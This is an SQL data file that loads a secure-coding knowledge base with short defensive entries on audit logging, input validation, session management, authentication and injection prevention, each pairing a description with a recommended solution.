INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Audit logsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAn audit trail (also called audit log) is a security-relevant chronological record,NEWLINEset of records, and/or destination and source of records that provide documentaryNEWLINEevidence of the sequence of activities that have affected at any time a specific operation,NEWLINEprocedure, or event.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAn audit log should contain the following items:NEWLINENEWLINE-User idNEWLINE-OperationNEWLINE-Success/failure of the operationNEWLINE-PrivilegesNEWLINE-TimestampNEWLINENEWLINEDepending on the gravity of the users violation there should also be a record kept forNEWLINEeach user to lock their accounts after a certain number of violations. This should beNEWLINEapplied since we can now assume it is an attacker trying to compromise your application.NEWLINENEWLINEAlso when doing audit logs make sure you always do logging before action in case theNEWLINEaction is not properly processed or terminated by your application. When using thisNEWLINEapproach you are always in possession of an complete audit trail.NEWLINE', 'Audit logs'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# User credentials in audit logsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever there are user credentials supplied in an audit log,NEWLINEthis could become a risk whenever an attacker could gain access to one of these log files.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEInstead of storing user credentials, you may want to use user id''s in order toNEWLINEidentify the user in the log files.NEWLINENEWLINERecommended knowledge-base item:NEWLINENEWLINE- Logging guidelinesNEWLINE', 'User credentials in audit logs'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Intrusion detecting and reportingNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll possible attacks on your application should be detected an reported in order toNEWLINEprevent further escalation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIntrusion detecting could be done by means of a:NEWLINENEWLINE"Positive security model:"NEWLINEIn this model you create certain regular expressions in order to only make the applicationNEWLINEpass the so called "known good".NEWLINEWhenever an application detects strange behavior and anomalies,NEWLINEthese issues should be reported. Keep in mind whenever the application changes thisNEWLINEwhitelist method has to evolve alongside with it. A big con is it could generate a lotNEWLINEof reports and alerts.NEWLINENEWLINENEWLINE"Negative security model:"NEWLINECreate a blacklist with known attacks and malicious input and make the application reportNEWLINEon detection of this input. You could also prioritise different malicious input andNEWLINEclassify them into different groups.NEWLINENEWLINEWhatever method you may choose to prefer, you should always ensure error handling logic inNEWLINEsecurity controls denies access by default. With this approach applied you will have aNEWLINEhigher probability that whenever an attacker manages to break your applications intendedNEWLINEoperation, it will not fail in a way which increases his attack vector.NEWLINE', 'Intrusion detecting and reporting'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XML injectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEXML Injection is an attack technique used to manipulate or compromise the logic of an XMLNEWLINEapplication or service. The injection of unintended XML content and/or structures intoNEWLINEan XML message can alter the intend logic of the application. Further, XML injectionNEWLINEcan cause the insertion of malicious content into the resulting message/document.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIn addition to the existing input validation, define a positive approach whichNEWLINEescapes/encodes characters that can be interpreted as xml. At a minimum this includesNEWLINEthe following: < > / " ''NEWLINE', 'XML injection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication at a central locationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthentication should always be performed at a central location in the application inNEWLINEorder to prevent missing authentication on certain levels in the application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEUse a central location for authentication. If u want to put extra constraints on theNEWLINEusers for accessing critical parts of your application you have to implementNEWLINEstep-up or adaptive authentication mechanisms.NEWLINENEWLINEVerify that alternative and less secure access paths do not exist.NEWLINE', 'Authentication at a central location'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# IP address in internal HTTP headersNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever IP addresses are used in HTTP headers in internal structures of your organization,NEWLINEan attacker could use these to enlarge his attack vector and recon yourNEWLINEinternal infrastructures.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINENever use IP addresses in internal HTTP headers.NEWLINE', 'IP adresses in internal HTTP headers'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Authentication enforced by the web-severNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAuthentication should be enforced by the web-server. Whenever these configurations areNEWLINEnot enabled on the server an attacker could gain access to authorizedNEWLINEpages on your application.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways make sure your web-server is correctly configured to enforce authentication,NEWLINEsuch as a session management implementation.NEWLINE', 'Authentication enforced by the web sever'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# The audit log must include a priority system.NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the audit log does not contain a clear priority system it will be difficult toNEWLINEprioritize different types of process failures.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever the web-application is writing error messages to the error log then these needNEWLINEto have a correct priority label. The labels that you can use are LOW, MEDIUM and HIGH.NEWLINEThese labels can then be used at a later moment in time for easy and quick analysingNEWLINEcapabilities of the log files.NEWLINENEWLINEYou should also verify security logging controls provide the ability to log success andNEWLINEparticularly failure events that are identified as security-relevant.NEWLINE', 'The audit log must include a priority system'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Servers must not be trusted without explicit authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the server your web-application is connecting towards is not using any form ofNEWLINEexplicit authentication and is internet facing then this results into that the serverNEWLINEcannot be trusted. This is because the server can be potentially be owned and managed byNEWLINEeverybody including hackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEWhenever the web-application is facing the internet third parties trying toNEWLINEaccess it should always use a form of authentication in order to gain access.NEWLINE', 'Servers must not be trusted without explicit authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Ensure overall securityNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINESome parts of the application at first sight might seem to acquire a higher level ofNEWLINEsecurity than i.e unauthorized/public parts of the application.NEWLINEThis however is not true since breaching public parts could also lead to an attackerNEWLINEcompromising the application or other users accounts.NEWLINENEWLINE## Solution:NEWLINENEWLINEAlways ensure full hardened security on all layers of the web application.NEWLINENEWLINERecommended knowledge-base item:NEWLINENEWLINE- High level architecture should be definedNEWLINE', 'Ensure overall security'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Re-authenticationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever a user is changing credentials such as his password, the user should always beNEWLINEchallenged by the application to re-authenticate himself. This is in order to prevent anNEWLINEattacker to change credentials if ever an attacker could hijack another users session.NEWLINENEWLINEVerify that the changing password functionality includes the old password,NEWLINEthe new password, and a password confirmation, as well as a passphrase strength indicationNEWLINEto encourage the adoption of strong password phrases.  NEWLINENEWLINE## Solution:NEWLINENEWLINEA user should always be challenged by the application to re-authenticate themselves afterNEWLINEchanging their credentials, e-mail or doing other important data exchanges such asNEWLINEtransferring money. You could also consider using step up, adaptive authentication orNEWLINEtwo factor authentication, or transaction signing depending on how critical yourNEWLINEapplication is.NEWLINENEWLINERecommended knowledge base item:NEWLINENEWLINE- Step up or adaptive authenticationNEWLINE', 'Re authentication'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# No shared knowledge for secret questionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever an application ask an user a secret question such as for i.e a password forgotNEWLINEfunctionality, these questions should not be shared knowledge an attacker could get fromNEWLINEthe web to prevent him compromising the account by this function.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESecret questions should never include shared knowledge, predictable or easyNEWLINEguessable values.NEWLINE', 'No shared knowledge for secret questions'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Disallow the use of old passwordsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis is a mitigation of the risk that a password can leak by any means towards a possible,NEWLINEattacker. By changing the password to a new one minimizes the damage.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEKeep the old entries of the password record of the user. If the user changes his passwordNEWLINEyou can match against the old entries to validate it is not an old one.NEWLINE', 'Disallow the use of old passwords'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Absolute session time-outNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEAll sessions should implement an absolute timeout, regardless of session activity.NEWLINEThis timeout defines the maximum amount of time a session can be active,NEWLINEclosing and invalidating the session upon the defined absolute period since the givenNEWLINEsession was initially created by the web application. After invalidating the session,NEWLINEthe user is forced to (re)authenticate again in the web application and establishNEWLINEa new session. The absolute session limits the amount of time an attacker can use aNEWLINEhijacked session and impersonate the victim user.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEAlways ensure that sessions absolute time-out server-side in order to decrease a hackersNEWLINEattack vector.NEWLINE', 'Absolute session time out'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# XSLT injectionsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe vulnerability occurs when a XSL file is loaded from a source controlled by an attacker.NEWLINEWhen the attacker is given the opportunity to specify the source of the included XSL fileNEWLINEhe could include a file which contains malicious code to be parsed on the target application.NEWLINEThis could lead to, code execution, reading arbitrary files and many moreNEWLINEvulnerabilities such as XSS.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINETo protect against such vulnerability one needs to make sure that he does not useNEWLINEuser-supplied input in the XSL filename.NEWLINEThe best solution would be to define a list of permitted filenames andNEWLINEonly accept XSL filenames from that list.NEWLINE', 'XSLT injections'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logout structuringNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEPlacing a logout link on every page that requires authentication helps the user end theNEWLINEsession when he is done with the site. Ending the session helps prevent hijacking.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEIdentify all pages that use authentication. Make a list of all pages on your site that useNEWLINEauthentication then verify the presence of logout links. Examine each page that usesNEWLINEauthentication to make sure it has a logout link in a location that can beNEWLINEfound intuitively.NEWLINE', 'Logout structuring'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Verify that the session id is never disclosedNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEIf the session id is disclosed in the URL the users session id can be easily obtained byNEWLINEan attacker and could leak through the referrer header towards other severs. Also wheneverNEWLINEthe session id is disclosed in the URL the possibility also arises to perform otherNEWLINEattacks like session fixation which could lead to session hijacking.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESession id should never be included in places other than the application cookie header.NEWLINE', 'Verify that the session id is never disclosed'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Session cookies (Domain)NEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe Domain option allows you to specify whether or not to send the cookie to subdomains.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESetting www.example.com will mean only the exact domain www.example.com willNEWLINEbe matched, while .example.com (wildcard) will also match again anyNEWLINEsubdomain (forums.example.com, blog.example.com).NEWLINENEWLINEThe use of a wildcard is not recommended at all and should be avoided.NEWLINENEWLINEThere are a lot of different mitigations in order to harden your session management.NEWLINEThese mitigations are amongst others the setting of the "HttpOnly and secure" flags onNEWLINEyour sessions. Follow the "Sessions pattern" list to make sure your session management isNEWLINEsecure.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Cross subdomain cookie attacksNEWLINE- Sessions patternNEWLINE', 'Session Domain cookies'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Access control failureNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEHandling errors securely is a key aspect of secure coding. There are two types of errorsNEWLINEthat deserve special attention. The first is exceptions that occur in the processing of aNEWLINEsecurity control itself. It is important that these exceptions do not enable behaviourNEWLINEthat the countermeasures would normally not allow. As a developer, you should considerNEWLINEthat there are generally three possible outcomes from a securityNEWLINEmechanism: allow the operation, disallow the operation, exception In general.NEWLINEYou should design your security mechanism so that a failure will follow the sameNEWLINEexecution path as disallowing the operation.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINESecurity methods like isAuthorized(), isAuthenticated(), and validate() should all returnNEWLINEfalse if there is an exception during processing.NEWLINEIf security controls can throw exceptions, they must be very clear about exactly what thatNEWLINEcondition means.NEWLINE', 'Access control failure'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Input rejectionNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhenever the application detects malicious or unexpected user-input you want to make sureNEWLINEthe application actual rejects the submitted user-input rather than directly process it.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that the application actually rejects the user requests whenever malicious inputNEWLINEis detected by your application. The base of this process will be checking the applicationNEWLINEfor expected user-input, for example: Whenever the user is filling in a form whichNEWLINEcontains a checkbox, there are fixed values which your application can expect fromNEWLINEthe user to return. Whenever this value differs from what the application served the userNEWLINEas possible answers, you can assume the request was corrupted and you reject the request.NEWLINENEWLINEYou must also keep track of the users movements by adding an audit trail as well as anNEWLINEcounter for tracking the number of his violations(submitting bad input) in your inputNEWLINEvalidation class. You should enforce a lockout whenever a unreasonable number ofNEWLINEviolations are detected by your application in order to protect it from attackers.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Input validationNEWLINE- Client side input validationNEWLINE- Single input validation controlsNEWLINE- Character encodingNEWLINE', 'Input rejection'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Input validationNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINETo ensure that the application is robust against all forms of input data, this data shouldNEWLINEbe sanitized and/or encoded server-side since an attacker could otherwise easy bypassNEWLINEthese checks with an intercepting proxy.NEWLINENEWLINE## Solution:NEWLINENEWLINEAll input validation and encoding-routines should be implemented on the server-sideNEWLINEoutside the reach of an attacker. Just as with the input rejection you should make sure thatNEWLINEafter validating the user-input, whenever the input is bad it actually rejects, sanitizesNEWLINEor formats your user-input into not malicious data.NEWLINENEWLINEThe recommended method for validating user input would be the positive validation method.NEWLINEWhite-list input validation means allowing only input that is explicitly defined as valid,NEWLINEas opposed to black-list input validation, which filters out known bad input.NEWLINENEWLINEYou must also keep track of the users movements by adding an audit trail as well as anNEWLINEcounter for tracking the number of his violations(submitting bad input) in your inputNEWLINEvalidation class. You should enforce a lockout whenever a unreasonable number ofNEWLINEviolations are detected by your application in order to protect it from attackers.NEWLINENEWLINEAlso verify that structured data is strongly typed and validated against a defined schemaNEWLINEincluding allowed characters, length and pattern (e.g. credit card numbers or telephone,NEWLINEor validating that two related fields are reasonable, such as validating suburbs and zipNEWLINEor post codes match).NEWLINENEWLINEThis also goes for whenever you are expecting just an integer or alphanumeric values etc.NEWLINEEvery detection of input outside of the intended operation of the application should beNEWLINElogged and rejected by your application.NEWLINENEWLINENote: All this validation and rejection should always be performed on the server side.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Input rejectionNEWLINE- Client side validationNEWLINE- Single input validation controlsNEWLINE', 'Input validation'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Single input validation controlsNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEInput validation refers to the process of validating all the input to an applicationNEWLINEbefore using it. Input validation is absolutely critical to application security,NEWLINEand most application risks involve tainted input at some level.NEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that a single input validation control is used by the application for eachNEWLINEtype of data that is accepted. This way your validation controls stay clear, transparentNEWLINEand manageable. This method leaves less room for error.NEWLINENEWLINERecommended knowledge base items:NEWLINENEWLINE- Positive validation methodNEWLINE- Input validationNEWLINE- Input rejectionNEWLINE- Client side input validationNEWLINE- Character encodingNEWLINE', 'Single input validation controls'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging validation failuresNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEWhen you log all the input validation failures in your application you can discover in anNEWLINEearly stage that your application is under attack and take quick countermeasures againstNEWLINEthe attackers.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all input validation failures are logged in order to counter possible attacksNEWLINEin an early stage. Also you want to verify that error handling logic in security controlsNEWLINEdenies access by default.NEWLINE', 'Logging validation failures'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging implemented on the server-sideNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINELogging should always be implemented on the server-side since an attacker otherwise NEWLINEmanipulate the functionality and erase his traces.NEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEVerify that all logging controls are implemented on the server-side.NEWLINE', 'Logging implemented on the serverside'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('# Logging guidelinesNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThe logging should contain some guidelines in order to organize your logging file in suchNEWLINEa way it becomes clear and easy to find informationNEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThe logging file should at least contain, a timestamp from a reliable source, severityNEWLINElevel of the event, an indication that this is a security relevant eventNEWLINE(if mixed with other logs), the identity of the user that caused the eventNEWLINE(if there is a user associated with the event), the source IP address of the requestNEWLINEassociated with the event, whether the event succeeded or failed, and aNEWLINEdescription of the event. Also verify that log fields from trusted and untrusted sourcesNEWLINEare distinguishable in log entries, preferably stored in different files so they cannotNEWLINEtaint each other whenever log injection occurs.NEWLINENEWLINEVerify accessing sensitive data is logged, if the data is collected under relevant data protectionNEWLINEdirectives or where logging of accesses is required.NEWLINE', 'Logging guidelines'); 
INSERT OR REPLACE INTO kb_items (content, title) VALUES ('Not available itemNEWLINE-------NEWLINENEWLINE## Description:NEWLINENEWLINEThis item is currently not available.NEWLINENEWLINENEWLINENEWLINE## Solution:NEWLINENEWLINEThis item is currently not available.NEWLINE', 'not available item'); 
